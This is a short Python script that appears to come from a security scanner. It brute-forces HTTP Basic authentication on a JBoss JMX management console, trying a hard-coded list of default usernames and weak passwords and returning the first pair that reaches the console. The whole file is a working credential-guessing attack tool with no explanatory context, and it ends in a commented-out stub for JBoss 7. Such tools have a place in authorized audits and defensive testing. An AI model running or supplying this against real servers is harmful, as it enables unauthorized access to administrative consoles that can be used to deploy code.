#! /usr/bin/env python
#coding:utf-8


import base64
import requests

def WeakScan(host,port):
    flag = ['JBoss JMX Management Console','jboss.deployment']
    username = ['test','root','jboss','admin','manager']
    password = ['jboss','123456','admin','admin123']
    hosts = 'http://'+host+':'+str(port)
    for user in username:
        for pwd in password:
            url = '%s/jmx-console' % (hosts)
            constr = user+':'+pwd
            bas64constr = base64.b64encode(constr.encode('utf-8'))
            b64str = bas64constr.decode('utf-8')
            headers = {
                        "Authorization": "Basic "+b64str ,
            }
            try:
                req = requests.get(url=url,headers=headers,timeout=10)
                req_text = req.text
                req_code = req.status_code
                print(req_code)
            except Exception as e:
                break
            if req_code == 404:
                break
            if req_code == 401:
                continue
            for f in flag:
                if f in req_text:
                    return(constr)

    #jboss 7
    # for user in username:
    #     for pwd in password:
    #         url = '%s/console/App.html' % (host)


